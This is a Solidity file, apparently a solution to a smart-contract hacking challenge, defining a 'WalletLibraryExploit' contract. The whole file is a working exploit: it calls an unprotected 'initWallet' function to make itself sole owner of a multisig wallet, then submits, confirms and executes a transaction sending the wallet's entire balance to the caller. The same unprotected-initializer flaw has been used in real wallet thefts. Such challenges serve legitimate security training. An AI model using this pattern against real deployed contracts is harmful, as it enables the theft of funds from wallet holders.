// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "./WalletLibrary.sol";

function playerScript(address instanceAddress) {
    new WalletLibraryExploit().exploit(instanceAddress);
}

contract WalletLibraryExploit {
    function exploit(address instanceAddress) public {
        WalletLibrary wallet = WalletLibrary(payable(instanceAddress));
        address[] memory owners = new address[](1);
        owners[0] = address(this);
        wallet.initWallet(owners, 1);
        uint256 txIndex = wallet.getTransactionCount();
        wallet.submitTransaction(msg.sender, instanceAddress.balance, "");
        wallet.confirmTransaction(txIndex);
        wallet.executeTransaction(txIndex);
    }
}
